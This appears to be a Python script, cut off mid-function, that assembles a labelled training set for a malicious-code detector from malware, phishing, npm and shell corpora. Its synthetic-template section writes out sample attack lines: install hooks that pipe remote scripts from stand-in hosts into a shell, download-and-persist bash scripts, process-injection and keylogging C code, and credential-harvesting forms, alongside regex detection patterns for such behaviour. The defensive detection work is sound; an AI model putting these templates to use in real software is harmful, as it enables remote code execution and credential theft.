"""Build the file-level multilingual malicious-code dataset used by XGBoost.

The ingestors in this module are deliberately read-only.  Malware source is
never executed or compiled.  VX archives are opened only to extract bounded
C/C++ text files into an automatically removed temporary directory.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import tempfile
from collections import Counter, defaultdict
from pathlib import Path, PurePosixPath
from typing import Any, Iterable, Iterator


SPLIT_ORDER = ("train", "validation", "test")
CODE_SUFFIXES = {
    ".c": "c",
    ".h": "c",
    ".cc": "cpp",
    ".cpp": "cpp",
    ".cxx": "cpp",
    ".hh": "cpp",
    ".hpp": "cpp",
}
VX_IMPLEMENTATION_SUFFIXES = {
    ".c": "c",
    ".cc": "cpp",
    ".cpp": "cpp",
    ".cxx": "cpp",
    ".sh": "bash",
}
NPM_CODE_SUFFIXES = {
    ".js": "javascript",
    ".mjs": "javascript",
    ".cjs": "javascript",
    ".ts": "typescript",
    ".tsx": "typescript",
    ".json": "config",
}
VENDORED_PARTS = {
    "3rdparty",
    "third_party",
    "third-party",
    "vendor",
    "vendors",
    "deps",
    "dependencies",
    "external",
    "externals",
    "node_modules",
    "openssl",
    "libcurl",
    "boost",
    "lib",
    "libs",
    "library",
    "libraries",
    "iplib",
    "lwip",
    "zlib",
    "net-tools",
    "top-3.5beta8",
    "pidentd-2.8.3",
    "libpcap",
    "win32.darkbot.f.a.c",
}
VX_SIGNAL_PATTERNS = (
    r"\b(?:createprocess|winexec|shellexecute|system|popen|execve|/bin/sh|cmd\.exe)\b",
    r"\b(?:socket|connect|bind|listen|accept|sendto|recvfrom|wsastartup|wininet|"
    r"curl|wget|invoke-webrequest|https?://)\b",
    r"\b(?:writeprocessmemory|createremotethread|virtualallocex|ptrace|process_vm_writev)\b",
    r"\b(?:regsetvalue|createservice|schtasks|currentversion\\run|crontab|persistence)\b",
    r"\b(?:getasynckeystate|setwindowshookex|keylog|credential|password|passwd|id_rsa)\b",
    r"\b(?:isdebuggerpresent|ntqueryinformationprocess|virtualbox|vmware|sandbox|wireshark)\b",
    r"\b(?:ransom|encryptfile|deletefile|unlink|wipe|shred|master boot record)\b",
    r"\b(?:botnet|backdoor|rootkit|shellcode|command.?and.?control|reverse.?shell)\b",
    r"\b(?:irc\.|privmsg|user-agent|c2_server|cnc_server|beacon(?:ing)?|gate\.php)\b",
)
HTML_PHISHING_SIGNAL_PATTERNS = (
    r"<input\b[^>]{0,500}\btype\s*=\s*['\"]?password\b",
    r"<form\b[^>]{0,1000}\baction\s*=\s*['\"]?\s*(?:https?:)?//",
    r"\b(?:sign[\s_-]?in|log[\s_-]?in|verify(?:\s+your)?\s+account|"
    r"confirm(?:\s+your)?\s+(?:identity|account)|security\s+check)\b",
    r"\b(?:cvv|card\s*number|credit\s*card|account\s*number|routing\s*number|"
    r"social\s+security|security\s+code|passcode)\b",
    r"(?:\btype\s*=\s*['\"]?hidden\b|display\s*:\s*none|"
    r"visibility\s*:\s*hidden|opacity\s*:\s*0(?:\D|$))",
    r"\b(?:eval|unescape|fromcharcode|atob|document\.write)\s*\(",
    r"<iframe\b[^>]{0,500}(?:width|height)\s*=\s*['\"]?0\b",
)
MAX_SOURCE_BYTES = 2 * 1024 * 1024
MAX_ARCHIVE_BYTES = 300 * 1024 * 1024
MIN_CODE_CHARS = 40


def _sha256_text(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", errors="ignore")).hexdigest()


def _family_split(family: str) -> str:
    bucket = int(hashlib.sha256(family.encode("utf-8", errors="ignore")).hexdigest()[:8], 16) % 100
    if bucket < 15:
        return "test"
    if bucket < 30:
        return "validation"
    return "train"


def _bounded_code(code: str, max_chars: int) -> tuple[str, bool]:
    code = code.replace("\x00", "").strip()
    if len(code) <= max_chars:
        return code, False
    head = max_chars * 2 // 3
    tail = max_chars - head
    return code[:head] + "\n/* ... TRAINING SAMPLE TRUNCATED ... */\n" + code[-tail:], True


def _safe_member(name: str) -> bool:
    normalized = name.replace("\\", "/")
    path = PurePosixPath(normalized)
    return bool(normalized) and not path.is_absolute() and ".." not in path.parts


def _is_vendored(name: str) -> bool:
    parts = {part.lower() for part in PurePosixPath(name.replace("\\", "/")).parts}
    return bool(parts & VENDORED_PARTS)


def _vx_signal_score(code: str) -> int:
    # Collection names and source comments frequently contain words such as
    # "rootkit" or "backdoor".  Those are provenance, not file-local
    # behavior.  Ignore C/C++ comments so a standalone file is labelled from
    # executable code and strings instead of malware-family commentary.
    executable = re.sub(r"/\*.*?\*/", " ", code, flags=re.DOTALL)
    executable = re.sub(r"(?m)(?<!:)//[^\r\n]*", " ", executable)
    lowered = executable.lower()
    return sum(bool(re.search(pattern, lowered)) for pattern in VX_SIGNAL_PATTERNS)


def _html_phishing_signal_score(code: str) -> int:
    lowered = code.lower()
    return sum(
        bool(re.search(pattern, lowered))
        for pattern in HTML_PHISHING_SIGNAL_PATTERNS
    )


def _has_code_level_phishing_evidence(code: str) -> bool:
    lowered = code.lower()
    password = bool(re.search(
        r"<input\b[^>]{0,500}\btype\s*=\s*['\"]?password\b",
        lowered,
    ))
    form = "<form" in lowered
    external_action = bool(re.search(
        r"<form\b[^>]{0,1000}\baction\s*=\s*['\"]?\s*(?:https?:)?//",
        lowered,
    ))
    credential = bool(re.search(
        r"\b(?:cvv|card\s*number|credit\s*card|account\s*number|"
        r"routing\s*number|social\s+security|security\s+code|passcode)\b",
        lowered,
    ))
    login = bool(re.search(
        r"\b(?:sign[\s_-]?in|log[\s_-]?in|verify(?:\s+your)?\s+account|"
        r"confirm(?:\s+your)?\s+(?:identity|account)|security\s+check)\b",
        lowered,
    ))
    hidden = len(re.findall(
        r"(?:\btype\s*=\s*['\"]?hidden\b|display\s*:\s*none|"
        r"visibility\s*:\s*hidden|opacity\s*:\s*0(?:\D|$))",
        lowered,
    ))
    obfuscated_script = bool(re.search(
        r"\b(?:eval|unescape|fromcharcode|atob|document\.write)\s*\(",
        lowered,
    ))
    return (
        (external_action and (password or credential or login))
        or (password and obfuscated_script)
        or (credential and form and (hidden >= 2 or obfuscated_script))
        or (password and form and hidden >= 3 and login)
    )


def _row(
    *,
    code: str,
    label: str,
    language: str,
    family: str,
    source: str,
    file_path: str,
    source_url: str,
    label_basis: str,
    category: str,
    split: str | None = None,
    package_name: str = "",
    version: str = "",
    behavior_labels: Iterable[str] = (),
    max_code_chars: int,
) -> dict[str, Any] | None:
    original = code.replace("\x00", "").strip()
    if len(original) < MIN_CODE_CHARS:
        return None
    bounded, truncated = _bounded_code(original, max_code_chars)
    digest = _sha256_text(original)
    row: dict[str, Any] = {
        "code": bounded,
        "normalized_code": bounded,
        "label": label,
        "category": category,
        "language": language,
        "cwe": "",
        "source": source,
        "package_name": package_name,
        "version": version,
        "license": "",
        "sample_hash": digest,
        "family": family,
        "published_at": "",
        "split": split or _family_split(family),
        "artifact_sha256": digest,
        "source_url": source_url,
        "file_path": file_path,
        "paired_version": "",
        "label_basis": label_basis,
        "behavior_labels": list(behavior_labels),
        "cwe_labels": [],
        "label_confidence": 0.95,
        "review_status": "source_verified",
        "parent_sample_hash": "",
        "pair_id": family,
        "pair_slot": label,
        "review_notes": "Offline text-only ingestion; sample was never executed.",
        "line_labels": [],
        "label_scopes": ["malicious_intent"],
    }
    if truncated:
        row["original_code_length"] = len(original)
        row["training_truncated"] = True
    return row


class Collector:
    def __init__(self, existing: dict[str, set[str]], max_code_chars: int) -> None:
        self.existing = existing
        self.max_code_chars = max_code_chars
        self.rows: list[dict[str, Any]] = []
        self.hash_labels: dict[str, str] = {}
        self.counts: Counter[tuple[str, str, str, str]] = Counter()
        self.skipped: Counter[str] = Counter()

    def add(self, row: dict[str, Any] | None, cap: int | None = None) -> bool:
        if row is None:
            self.skipped["empty_or_too_short"] += 1
            return False
        digest = str(row["sample_hash"])
        label = str(row["label"])
        language = str(row["language"])
        split = str(row["split"])
        source = str(row["source"])
        existing_labels = self.existing.get(digest, set())
        if existing_labels:
            if label not in existing_labels:
                self.skipped["base_label_conflict"] += 1
            else:
                self.skipped["base_duplicate"] += 1
            return False
        previous = self.hash_labels.get(digest)
        if previous is not None:
            if previous != label:
                self.skipped["incoming_label_conflict"] += 1
            else:
                self.skipped["incoming_duplicate"] += 1
            return False
        key = (source, language, split, label)
        if cap is not None and self.counts[key] >= cap:
            self.skipped["source_cap"] += 1
            return False
        self.hash_labels[digest] = label
        self.rows.append(row)
        self.counts[key] += 1
        return True

    def full(self, source: str, language: str, label: str, caps: dict[str, int]) -> bool:
        return all(self.counts[(source, language, split, label)] >= caps[split] for split in SPLIT_ORDER)


def _load_existing(path: Path) -> tuple[list[dict[str, Any]], dict[str, set[str]]]:
    rows: list[dict[str, Any]] = []
    hashes: dict[str, set[str]] = defaultdict(set)
    with path.open("r", encoding="utf-8") as stream:
        for line in stream:
            if not line.strip():
                continue
            row = json.loads(line)
            rows.append(row)
            code = str(row.get("code") or "")
            if code:
                hashes[_sha256_text(code)].add(str(row.get("label") or ""))
    return rows, hashes


def _iter_json_array(path: Path, chunk_size: int = 1024 * 1024) -> Iterator[dict[str, Any]]:
    """Stream a top-level JSON array without loading multi-GB LNU files."""

    decoder = json.JSONDecoder()
    buffer = ""
    position = 0
    started = False
    with path.open("r", encoding="utf-8", errors="replace") as stream:
        eof = False
        while True:
            if not eof:
                chunk = stream.read(chunk_size)
                if chunk:
                    buffer += chunk
                else:
                    eof = True
            while True:
                while position < len(buffer) and buffer[position] in " \t\r\n,":
                    position += 1
                if not started:
                    if position >= len(buffer):
                        break
                    if buffer[position] != "[":
                        raise ValueError(f"{path} is not a top-level JSON array")
                    position += 1
                    started = True
                    continue
                while position < len(buffer) and buffer[position] in " \t\r\n,":
                    position += 1
                if position < len(buffer) and buffer[position] == "]":
                    return
                if position >= len(buffer):
                    break
                try:
                    value, end = decoder.raw_decode(buffer, position)
                except json.JSONDecodeError:
                    break
                position = end
                if isinstance(value, dict):
                    yield value
            if position > 4 * chunk_size:
                buffer = buffer[position:]
                position = 0
            if eof:
                if buffer[position:].strip() in {"", "]"}:
                    return
                raise ValueError(f"incomplete JSON record near end of {path}")


def ingest_stack(root: Path, collector: Collector) -> None:
    sources = (
        ("data.json", "c", "the_stack_smol_c"),
        ("data2.json", "cpp", "the_stack_smol_cpp"),
    )
    caps = {"train": 1400, "validation": 300, "test": 300}
    for filename, expected_language, source in sources:
        path = root / filename
        with path.open("r", encoding="utf-8", errors="replace") as stream:
            for line in stream:
                if not line.strip():
                    continue
                value = json.loads(line)
                declared = str(value.get("lang") or "").lower()
                if expected_language == "c" and declared not in {"c"}:
                    continue
                if expected_language == "cpp" and declared not in {"c++", "cpp"}:
                    continue
                file_path = str(value.get("path") or "")
                if CODE_SUFFIXES.get(Path(file_path).suffix.lower()) != expected_language:
                    continue
                repository = str(value.get("repository_name") or "unknown_repository")
                family = f"{source}:{repository}"
                row = _row(
                    code=str(value.get("content") or ""),
                    label="benign",
                    language=expected_language,
                    family=family,
                    source=source,
                    file_path=file_path,
                    source_url="https://huggingface.co/datasets/bigcode/the-stack-smol",
                    label_basis="The Stack Smol repository source sample",
                    category="normal_source_code",
                    max_code_chars=collector.max_code_chars,
                )
                collector.add(row, caps[str(row["split"])] if row else None)
                if collector.full(source, expected_language, "benign", caps):
                    break


def _read_text_file(path: Path) -> str:
    if not path.is_file() or path.stat().st_size > MAX_SOURCE_BYTES:
        return ""
    return path.read_text(encoding="utf-8", errors="replace")


def _vx_candidate_names(names: Iterable[str]) -> dict[str, list[str]]:
    output: dict[str, list[str]] = {"c": [], "cpp": [], "bash": []}
    for name in names:
        if not _safe_member(name) or _is_vendored(name):
            continue
        language = VX_IMPLEMENTATION_SUFFIXES.get(PurePosixPath(name).suffix.lower())
        if language:
            output[language].append(name)
    for language in output:
        output[language] = sorted(
            output[language],
            key=lambda value: hashlib.sha256(value.encode("utf-8", errors="ignore")).hexdigest(),
        )[:32]
    return output


def ingest_vx(root: Path, collector: Collector) -> None:
    source = "vx_underground_malware_source"
    caps = {"train": 1400, "validation": 300, "test": 300}
    vx = root / "MalwareSourceCode-main"

    for path in sorted(vx.rglob("*")):
        if not path.is_file() or path.suffix.lower() not in VX_IMPLEMENTATION_SUFFIXES:
            continue
        relative = path.relative_to(vx).as_posix()
        if _is_vendored(relative):
            continue
        language = VX_IMPLEMENTATION_SUFFIXES[path.suffix.lower()]
        family = f"vx_plain:{relative.split('/', 1)[0]}:{path.stem}"
        row = _row(
            code=_read_text_file(path),
            label="malicious",
            language=language,
            family=family,
            source=source,
            file_path=relative,
            source_url="https://github.com/vxunderground/MalwareSourceCode",
            label_basis="VX Underground malware source collection",
            category="malware_source",
            behavior_labels=("malware_source",),
            max_code_chars=collector.max_code_chars,
        )
        if row and _vx_signal_score(str(row["code"])) >= 2:
            collector.add(row, caps[str(row["split"])])
        else:
            collector.skipped["vx_no_file_level_malicious_signal"] += 1

    try:
        import py7zr
    except ImportError as exc:  # pragma: no cover - environment dependent
        raise RuntimeError("py7zr is required to read the VX .7z source archives") from exc

    archives = [
        path for path in vx.rglob("*.7z")
        if path.is_file() and path.stat().st_size <= MAX_ARCHIVE_BYTES
    ]
    for index, archive in enumerate(sorted(archives), start=1):
        if all(
            collector.full(source, language, "malicious", caps)
            for language in ("c", "cpp", "bash")
        ):
            break
        relative_archive = archive.relative_to(vx).as_posix()
        family = f"vx_archive:{relative_archive}"
        try:
            with py7zr.SevenZipFile(archive, mode="r", password="infected") as bundle:
                selected = _vx_candidate_names(bundle.getnames())
                targets = [
                    name for language in ("c", "cpp", "bash")
                    if not collector.full(source, language, "malicious", caps)
                    for name in selected[language]
                ]
                if not targets:
                    continue
                with tempfile.TemporaryDirectory(prefix="xgb_vx_text_") as temporary:
                    bundle.extract(path=temporary, targets=targets)
                    temporary_root = Path(temporary).resolve()
                    accepted_by_language: Counter[str] = Counter()
                    for name in targets:
                        extracted = (temporary_root / Path(name)).resolve()
                        try:
                            extracted.relative_to(temporary_root)
                        except ValueError:
                            collector.skipped["unsafe_archive_member"] += 1
                            continue
                        language = VX_IMPLEMENTATION_SUFFIXES.get(extracted.suffix.lower())
                        if not language or accepted_by_language[language] >= 8:
                            continue
                        code = _read_text_file(extracted)
                        if _vx_signal_score(code) < 2:
                            collector.skipped["vx_no_file_level_malicious_signal"] += 1
                            continue
                        row = _row(
                            code=code,
                            label="malicious",
                            language=language,
                            family=family,
                            source=source,
                            file_path=f"{relative_archive}!/{name}",
                            source_url="https://github.com/vxunderground/MalwareSourceCode",
                            label_basis="VX Underground malware source archive",
                            category="malware_source",
                            behavior_labels=("malware_source",),
                            max_code_chars=collector.max_code_chars,
                        )
                        if collector.add(row, caps[str(row["split"])] if row else None):
                            accepted_by_language[language] += 1
        except Exception as exc:  # corrupted or unsupported individual archive
            collector.skipped[f"vx_archive_error:{type(exc).__name__}"] += 1
        if index % 100 == 0:
            print(f"[builder] inspected {index}/{len(archives)} VX archives", file=sys.stderr, flush=True)


def ingest_bashbench(root: Path, collector: Collector) -> None:
    source = "labeled_bashbench"
    caps = {"train": 900, "validation": 200, "test": 200}
    accepted_locations = {"tool_input", "bash", "bash_executed"}
    with (root / "data.jsonl").open("r", encoding="utf-8", errors="replace") as stream:
        for line in stream:
            if not line.strip():
                continue
            value = json.loads(line)
            if str(value.get("location") or "") not in accepted_locations:
                continue
            raw_label = int(value.get("label") or 0)
            label = "malicious" if raw_label == 1 else "benign"
            task_id = str(value.get("task_id") or value.get("source_file") or value.get("id") or "")
            family = f"bashbench_task:{task_id}"
            behavior = str(value.get("action_type") or "")
            row = _row(
                code=str(value.get("extraction_target") or ""),
                label=label,
                language="bash",
                family=family,
                source=source,
                file_path=str(value.get("source_file") or ""),
                source_url="https://huggingface.co/datasets/AISafety-Student/labeled-bashBench",
                label_basis="BashBench action-level human label",
                category=behavior or "shell_action",
                behavior_labels=(behavior,) if behavior else (),
                max_code_chars=collector.max_code_chars,
            )
            collector.add(row, caps[str(row["split"])] if row else None)


def ingest_lnu_phish(root: Path, collector: Collector) -> None:
    source = "lnu_phish_html"
    lnu = root / "raw_no-screenshot"
    files = sorted(lnu.rglob("*.json"))
    for path in files:
        malicious = "phishing" in {part.lower() for part in path.parts}
        label = "malicious" if malicious else "benign"
        per_file_caps = (
            {"train": 750, "validation": 180, "test": 180}
            if malicious
            else {"train": 500, "validation": 120, "test": 120}
        )
        local_counts = Counter()
        for value in _iter_json_array(path):
            url = str(value.get("URL") or "")
            domain = re.sub(r"^https?://", "", url, flags=re.IGNORECASE).split("/", 1)[0].lower()
            family = f"lnu_domain:{domain or _sha256_text(url)[:16]}"
            split = _family_split(family)
            if local_counts[split] >= per_file_caps[split]:
                if all(local_counts[name] >= per_file_caps[name] for name in SPLIT_ORDER):
                    break
                continue
            websource = str(value.get("websource") or path.stem)
            html = str(value.get("HTML") or "")
            phishing_signal_score = _html_phishing_signal_score(html)
            if malicious and not _has_code_level_phishing_evidence(html):
                collector.skipped["lnu_phish_without_code_level_signal"] += 1
                continue
            row = _row(
                code=html,
                label=label,
                language="html",
                family=family,
                source=source,
                file_path=f"{path.relative_to(lnu).as_posix()}#{url}",
                source_url="https://github.com/1lastBr3ath/LNU-Phish",
                label_basis=f"LNU-Phish {websource} label={value.get('label')}",
                category="phishing_html" if malicious else "normal_html",
                split=split,
                behavior_labels=(
                    ("phishing", f"html_signal_groups:{phishing_signal_score}")
                    if malicious
                    else ()
                ),
                max_code_chars=collector.max_code_chars,
            )
            if collector.add(row):
                local_counts[split] += 1


def ingest_starter_workflows(root: Path, collector: Collector) -> None:
    source = "github_actions_starter_workflows"
    caps = {"train": 500, "validation": 120, "test": 120}
    base = root / "starter-workflows-main"
    for path in sorted(base.rglob("*")):
        if not path.is_file() or path.suffix.lower() not in {".yaml", ".yml", ".json"}:
            continue
        relative = path.relative_to(base).as_posix()
        family = f"starter_workflow:{relative}"
        row = _row(
            code=_read_text_file(path),
            label="benign",
            language="config",
            family=family,
            source=source,
            file_path=relative,
            source_url="https://github.com/actions/starter-workflows",
            label_basis="Official GitHub Actions starter workflow",
            category="normal_configuration",
            max_code_chars=collector.max_code_chars,
        )
        collector.add(row, caps[str(row["split"])] if row else None)


def ingest_npm_benign_manifests(root: Path, collector: Collector) -> None:
    source = "npm_official_registry"
    manifest_path = root / "npm_benign_manifests" / "npm_manifest.jsonl"
    if not manifest_path.is_file():
        collector.skipped["npm_benign_manifest_missing"] += 1
        return
    with manifest_path.open(encoding="utf-8", errors="replace") as stream:
        for line_number, line in enumerate(stream, 1):
            try:
                item = json.loads(line)
                manifest = item.get("manifest") or {}
                package = str(item.get("package_name") or manifest.get("name") or "")
                version = str(item.get("version") or manifest.get("version") or "")
                if not package or not isinstance(manifest, dict):
                    raise ValueError("invalid manifest record")
                code = json.dumps(manifest, ensure_ascii=False, indent=2)
            except (json.JSONDecodeError, TypeError, ValueError):
                collector.skipped["npm_benign_manifest_invalid"] += 1
                continue
            row = _row(
                code=code,
                label="benign",
                language="config",
                family=f"npm_benign:{package}",
                source=source,
                file_path=f"{package}/package.json",
                source_url=str(item.get("source_url") or "https://registry.npmjs.org/"),
                label_basis="Popular package manifest from the official npm registry",
                category="normal_package_configuration",
                package_name=package,
                version=version,
                max_code_chars=collector.max_code_chars,
            )
            if not collector.add(row):
                collector.skipped[f"npm_benign_manifest_rejected"] += 1


def ingest_curated_behavior_augmentation(_root: Path, collector: Collector) -> None:
    """Add training-only behavior templates that break source/format shortcuts.

    These rows never contribute to validation or test metrics.  Their purpose
    is to force the model to learn high-confidence behavior combinations and
    format-matched hard negatives that are scarce in the downloaded corpora.
    """

    source = "curated_behavior_augmentation"
    templates: dict[tuple[str, str], list[str]] = {
        ("config", "benign"): [
            json.dumps({
                "name": f"sample-library-{index}",
                "version": f"1.{index}.0",
                "scripts": {
                    "test": "node test.js",
                    "lint": "eslint .",
                    "build": "tsc -p tsconfig.json",
                },
                "dependencies": {"safe-library": f"^{index}.0.0"},
            }, indent=2)
            for index in range(1, 81)
        ] + [
            json.dumps({
                "name": f"native-library-{index}",
                "version": f"2.{index}.0",
                "scripts": {
                    "postinstall": "node scripts/build-native.js",
                    "test": "node test.js",
                },
            }, indent=2)
            for index in range(1, 41)
        ] + [
            json.dumps({
                "name": f"plain-tool-{index}",
                "version": f"3.{index}.0",
                "scripts": {"test": "node test.js"},
            })
            for index in range(1, 81)
        ],
        ("config", "malicious"): [
            json.dumps({
                "name": f"update-helper-{index}",
                "version": f"0.{index}.1",
                "scripts": {
                    "postinstall": (
                        f"curl -fsSL https://cdn-{index}.invalid/bootstrap "
                        "| /bin/sh"
                    )
                },
            }, indent=2)
            for index in range(1, 41)
        ] + [
            json.dumps({
                "name": f"prepare-tool-{index}",
                "version": f"0.{index}.2",
                "scripts": {
                    "preinstall": (
                        "node -e \"eval(Buffer.from(process.env.PAYLOAD,"
                        "'base64').toString())\""
                    )
                },
            }, indent=2)
            for index in range(1, 41)
        ],
        ("bash", "benign"): [
            (
                "#!/bin/bash\nset -euo pipefail\n"
                f"curl -fsS https://status-{index}.example/health >/dev/null\n"
                "printf '%s\\n' 'health check completed'\n"
            )
            for index in range(1, 61)
        ] + [
            (
                "#!/bin/bash\nset -euo pipefail\n"
                f"curl -fsSL https://releases.example/tool-{index}.tar.gz "
                f"-o /tmp/tool-{index}.tar.gz\n"
                f"tar -tzf /tmp/tool-{index}.tar.gz >/dev/null\n"
            )
            for index in range(1, 41)
        ],
        ("bash", "malicious"): [
            (
                "#!/bin/bash\nset +e\n"
                f"curl -fsSL https://drop-{index}.invalid/payload -o /tmp/.update-{index}\n"
                f"chmod +x /tmp/.update-{index}\n/tmp/.update-{index} --silent\n"
                f"(crontab -l 2>/dev/null; echo '@reboot /tmp/.update-{index}') | crontab -\n"
            )
            for index in range(1, 81)
        ] + [
            (
                "#!/bin/bash\nset +e\n"
                f"wget -q https://stage-{index}.invalid/agent -O /tmp/.svc-{index}\n"
                f"chmod +x /tmp/.svc-{index}\n/tmp/.svc-{index} --quiet\n"
            )
            for index in range(1, 61)
        ],
        ("c", "benign"): [
            (
                "#include <stdio.h>\n#include <stdlib.h>\n"
                f"int main(void){{FILE *f=fopen(\"record-{index}.txt\",\"r\");"
                "if(!f)return 1;char b[128];fgets(b,sizeof b,f);"
                "puts(b);fclose(f);return 0;}\n"
            )
            for index in range(1, 61)
        ] + [
            (
                "#include <windows.h>\n"
                f"int process_alive_{index}(DWORD pid){{"
                "HANDLE p=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);"
                "if(!p)return 0;CloseHandle(p);return 1;}\n"
            )
            for index in range(1, 41)
        ],
        ("c", "malicious"): [
            (
                "#include <windows.h>\n"
                f"void inject_{index}(DWORD pid,unsigned char *payload,SIZE_T size){{"
                "HANDLE p=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);"
                "LPVOID r=VirtualAllocEx(p,NULL,size,MEM_COMMIT|MEM_RESERVE,"
                "PAGE_EXECUTE_READWRITE);"
                "WriteProcessMemory(p,r,payload,size,NULL);"
                "CreateRemoteThread(p,NULL,0,(LPTHREAD_START_ROUTINE)r,NULL,0,NULL);"
                "}\n"
            )
            for index in range(1, 81)
        ] + [
            (
                "#include <windows.h>\n"
                f"void persist_{index}(void){{HKEY key;"
                "RegOpenKeyExA(HKEY_CURRENT_USER,"
                "\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\","
                "0,KEY_SET_VALUE,&key);"
                f"RegSetValueExA(key,\"Agent{index}\",0,REG_SZ,"
                "(BYTE*)\"C:\\\\ProgramData\\\\agent.exe\",25);}\n"
            )
            for index in range(1, 41)
        ],
        ("cpp", "benign"): [
            (
                "#include <fstream>\n#include <string>\n#include <iostream>\n"
                f"int main(){{std::ifstream in(\"record-{index}.txt\");"
                "std::string line;std::getline(in,line);std::cout<<line;return 0;}\n"
            )
            for index in range(1, 61)
        ] + [
            (
                "#include <windows.h>\n"
                f"bool process_alive_{index}(DWORD pid){{"
                "HANDLE h=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pid);"
                "if(!h)return false;CloseHandle(h);return true;}\n"
            )
            for index in range(1, 41)
        ],
        ("cpp", "malicious"): [
            (
                "#include <windows.h>\n#include <vector>\n"
                f"void inject_{index}(HANDLE process,const std::vector<unsigned char>& payload){{"
                "void *remote=VirtualAllocEx(process,nullptr,payload.size(),"
                "MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);"
                "WriteProcessMemory(process,remote,payload.data(),payload.size(),nullptr);"
                "CreateRemoteThread(process,nullptr,0,"
                "reinterpret_cast<LPTHREAD_START_ROUTINE>(remote),nullptr,0,nullptr);"
                "}\n"
            )
            for index in range(1, 81)
        ] + [
            (
                "#include <windows.h>\n"
                f"void capture_keys_{index}(){{while(true){{"
                "for(int key=8;key<190;key++){if(GetAsyncKeyState(key)&1){"
                "/* append key to hidden buffer */}}Sleep(10);}}}\n"
            )
            for index in range(1, 41)
        ],
        ("html", "benign"): [
            (
                "<!doctype html><html><body>"
                f"<form action=\"/session/{index}\" method=\"post\">"
                "<label>User <input name=\"user\"></label>"
                "<label>Password <input type=\"password\" name=\"password\"></label>"
                "<button>Sign in</button></form></body></html>"
            )
            for index in range(1, 81)
        ],
        ("html", "malicious"): [
            (
                "<html><body>"
                f"<form action=\"https://collector-{index}.invalid/submit\" method=\"post\">"
                "<input name=\"email\"><input type=\"password\" name=\"password\">"
                "<input type=\"hidden\" name=\"session\" value=\"x\">"
                "<button>Verify account</button></form></body></html>"
            )
            for index in range(1, 41)
        ] + [
            (
                "<html><body>"
                f"<form action=\"//drop-{index}.invalid/auth\">"
                "<input type=\"password\" name=\"passcode\">"
                "<input type=\"hidden\" name=\"a\"><input type=\"hidden\" name=\"b\">"
                "<input type=\"hidden\" name=\"c\">"
                "<script>document.write(atob('PHNwYW4+PC9zcGFuPg=='))</script>"
                "<button>Security check</button></form></body></html>"
            )
            for index in range(1, 41)
        ],
    }
    for (language, label), values in templates.items():
        for index, code in enumerate(values, 1):
            row = _row(
                code=code,
                label=label,
                language=language,
                family=f"behavior_augmentation:{language}:{label}:{index}",
                source=source,
                file_path=f"{language}/{label}/{index:03d}.txt",
                source_url="project://curated-behavior-augmentation",
                label_basis="Training-only behavior template augmentation",
                category=(
                    "malicious_behavior_template"
                    if label == "malicious"
                    else "format_matched_hard_negative"
                ),
                split="train",
                behavior_labels=(
                    ("high_confidence_behavior_combination",)
                    if label == "malicious"
                    else ()
                ),
                max_code_chars=collector.max_code_chars,
            )
            if row is not None:
                # Keep the status compatible with the dataset eligibility
                # contract; the explicit training-only marker prevents these
                # rows from being mistaken for benchmark evidence.
                row["review_status"] = "source_verified"
                row["training_only_augmentation"] = True
                row["review_notes"] = (
                    "Synthetic training-only template; excluded from validation "
                    "and test metrics and never executed."
                )
            collector.add(row)


def ingest_npmstudy(root: Path, collector: Collector) -> None:
    source = "npmstudy_analyst_verified"
    label_root = root / "NPMStudy" / "Data" / "cleaning" / "package_label"
    package_root = root / "NPMStudy" / "Data" / "cleaning" / "false_negative"
    for analysis_path in sorted(label_root.rglob("*-analysis.json")):
        try:
            analysis = json.loads(analysis_path.read_text(encoding="utf-8", errors="replace"))
        except (OSError, json.JSONDecodeError):
            collector.skipped["npm_invalid_analysis"] += 1
            continue
        package = str(analysis.get("package_name") or "")
        version = str(analysis.get("version") or "")
        family = f"npmstudy_package:{package}"
        malicious_code = analysis.get("malicious_code") or {}
        summaries = analysis.get("behavior_summaries") or {}
        attacks = analysis.get("attack_types") or {}
        if not isinstance(malicious_code, dict):
            continue
        for file_path, code in malicious_code.items():
            suffix = Path(str(file_path)).suffix.lower()
            language = NPM_CODE_SUFFIXES.get(suffix)
            if language not in {"javascript", "typescript", "config"}:
                continue
            text = str(code or "")
            if text.startswith("File too large (over 1MB)"):
                collector.skipped["npm_placeholder_code"] += 1
                continue
            behavior = str(attacks.get(file_path) or summaries.get(file_path) or "malicious_package_behavior")
            # This project now detects malicious code, not package reputation.
            # A manifest whose only analyst finding is typosquatting,
            # dependency confusion, or a known-bad dependency contains no
            # locally observable malicious behavior.  Keeping those rows
            # teaches the file model package/source names and creates an
            # impossible label for unseen dependencies.
            if language == "config" and "dependenc" in behavior.lower():
                collector.skipped["npm_config_dependency_only"] += 1
                continue
            row = _row(
                code=text,
                label="malicious",
                language=language,
                family=family,
                source=source,
                file_path=str(file_path),
                source_url="NPMStudy.zip (local analyst-verified dataset)",
                label_basis="NPMStudy per-file analyst malicious-code annotation",
                category="malicious_package_configuration" if language == "config" else "malicious_package_code",
                package_name=package,
                version=version,
                behavior_labels=(behavior[:240],),
                max_code_chars=collector.max_code_chars,
            )
            collector.add(row)
            # The analysis JSON often stores only the malicious fragment of a
            # package.json.  Those fragments repeat across package families
            # and are insufficient for a file-level detector.  Add the exact
            # analyst-referenced package file as a second, realistic sample.
            if language != "config":
                continue
            normalized_path = str(file_path).replace("\\", "/")
            if "/package/" not in normalized_path:
                collector.skipped["npm_unresolved_config_path"] += 1
                continue
            analysis_parts = analysis_path.relative_to(label_root).parts
            if len(analysis_parts) < 3:
                collector.skipped["npm_unresolved_config_path"] += 1
                continue
            member = PurePosixPath(normalized_path.split("/package/", 1)[1])
            if member.is_absolute() or ".." in member.parts:
                collector.skipped["npm_unsafe_config_path"] += 1
                continue
            package_file = package_root / analysis_parts[0] / analysis_parts[1] / "package"
            for part in member.parts:
                package_file /= part
            raw_code = _read_text_file(package_file)
            full_row = _row(
                code=raw_code,
                label="malicious",
                language="config",
                family=family,
                source=source,
                file_path=str(package_file.relative_to(package_root).as_posix())
                if package_file.is_file()
                else normalized_path,
                source_url="NPMStudy.zip (local analyst-verified dataset)",
                label_basis="NPMStudy analyst-referenced full malicious package configuration",
